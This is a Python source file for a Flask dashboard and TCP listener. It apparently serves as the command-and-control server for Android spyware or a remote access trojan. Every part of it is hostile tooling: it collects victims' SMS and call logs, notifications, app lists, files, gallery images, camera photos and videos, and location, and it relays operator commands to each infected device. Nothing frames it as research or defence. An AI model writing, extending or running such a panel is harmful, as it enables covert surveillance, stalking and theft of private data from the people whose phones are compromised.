import socket
import json
import threading
import base64
import os
import time
from flask import Flask, request, jsonify, render_template, send_from_directory
from werkzeug.utils import secure_filename

app = Flask(__name__)
clients = {}
server_logs = []
file_transfers = {}
data_lock = threading.Lock()

# Auto-create directories
DIRS = ['captured_images', 'device_downloads']
for d in DIRS:
    if not os.path.exists(d): os.makedirs(d)

def add_log(msg):
    t = time.strftime("%H:%M:%S")
    log = f"[{t}] {msg}"
    print(log)
    server_logs.insert(0, log)
    if len(server_logs) > 100: server_logs.pop()

def create_client_data():
    return {
        "sms": [], "calls": [], "apps": [], "notifications": [],
        "fm": {"path": "/", "files": []}, "gallery": {"page": 0, "files": []},
        "info": {}, "location": {"url": None, "img": None, "status": "idle"},
        "media": {"last_img": None, "last_vid": None, "status": "idle"}
    }

def process_packet(raw, cid):
    try:
        packet = json.loads(raw).get('data', {})
        t = packet.get('type')
        with data_lock:
            if cid not in clients: return
            cd = clients[cid]['data']
            
            if t == 'DEVICE_INFO': cd['info'].update(packet.get('info', {}))
            elif t == 'SMS_LOG': cd['sms'] = packet.get('logs', [])
            elif t == 'CALL_LOG': cd['calls'] = packet.get('logs', [])
            elif t == 'APP_LIST': cd['apps'] = packet.get('apps', [])
            elif t == 'NOTIFICATION_DATA': cd['notifications'].insert(0, packet.get('notification', {}))
            elif t == 'FILE_MANAGER_RESULT': cd['fm'].update(packet.get('listing', {}))
            elif t == 'LOCATION_SUCCESS':
                loc = packet.get('data', {}) if isinstance(packet.get('data'), dict) else {"url": packet.get('url')}
                cd['location'].update({"url": loc.get('url'), "img": loc.get('image_url'), "status": "success"})
            elif t == 'LOCATION_FAIL': cd['location']['status'] = f"Fail: {packet.get('error')}"
            elif t == 'RECORD_STATUS': cd['media']['status'] = packet.get('status')
            elif t == 'GALLERY_PAGE_DATA': cd['gallery'].update(packet.get('data', packet))
            elif t == 'WALLPAPER_STATUS': cd['media']['status'] = f"Wallpaper: {packet.get('status')}"
            elif 'CHUNK' in t:
                c_data = packet.get('chunk_data', {})
                fn = c_data.get('filename')
                if fn: file_transfers.setdefault(fn, []).append(c_data.get('chunk'))
            elif 'END' in t:
                fn = packet.get('file')
                if fn and fn in file_transfers:
                    folder = 'captured_images' if fn.endswith(('.jpg','.png','.mp4')) else 'device_downloads'
                    path = os.path.join(folder, secure_filename(fn))
                    with open(path, 'wb') as f:
                        f.write(base64.b64decode("".join(file_transfers.pop(fn))))
                    if fn.endswith('.mp4'): cd['media'].update({"last_vid": fn, "status": "Video Ready"})
                    else: cd['media'].update({"last_img": fn, "status": "Image Ready"})
                    add_log(f"Received File: {fn}")
            
            add_log(f"[{cid}] Event: {t}")
    except Exception as e: add_log(f"Parser Error: {e}")

def client_worker(conn, addr):
    cid = f"{addr[0]}:{addr[1]}"
    with data_lock: clients[cid] = {'socket': conn, 'data': create_client_data()}
    add_log(f"Agent In: {cid}")
    buffer = ""
    try:
        conn.settimeout(60)
        while True:
            data = conn.recv(16384).decode('utf-8', errors='ignore')
            if not data: break
            buffer += data
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip(): process_packet(line.strip(), cid)
    except: pass
    finally:
        with data_lock: 
            if cid in clients: del clients[cid]
        add_log(f"Agent Out: {cid}")
        conn.close()

def start_tcp():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(('0.0.0.0', 8888))
        s.listen(20)
        add_log("TCP Engine Active @ Port 8888")
        while True:
            c, a = s.accept()
            threading.Thread(target=client_worker, args=(c, a), daemon=True).start()
    except Exception as e: add_log(f"TCP Error: {e}")

@app.route('/')
def home(): return render_template('index.html')

@app.route('/api/status')
def status():
    with data_lock:
        devs = [{'id': k, 'model': v['data']['info'].get('Model','?'), 'bat': v['data']['info'].get('Battery','?')} for k,v in clients.items()]
    return jsonify({"logs": server_logs, "devices": devs})

@app.route('/api/data/<cid>')
def data(cid):
    with data_lock: return jsonify(clients[cid]['data'] if cid in clients else {"error": 404})

@app.route('/api/command', methods=['POST'])
def command():
    r = request.json
    cid, cmd = r.get('client_id'), r.get('cmd')
    with data_lock:
        if cid in clients:
            try:
                clients[cid]['socket'].sendall(f"{cmd}\n".encode())
                add_log(f"Sent > {cmd} to {cid}")
                return jsonify({"status": "ok"})
            except: return jsonify({"status": "fail"}), 500
    return jsonify({"status": "not_found"}), 404

@app.route('/api/delete', methods=['POST'])
def delete():
    fn = secure_filename(request.json.get('filename'))
    for d in DIRS:
        p = os.path.join(d, fn)
        if os.path.exists(p): 
            os.remove(p)
            return jsonify({"status": "ok"})
    return jsonify({"status": "error"})

@app.route('/captured_images/<path:f>')
def serve(f): return send_from_directory('captured_images', f)

if __name__ == '__main__':
    threading.Thread(target=start_tcp, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), debug=False)
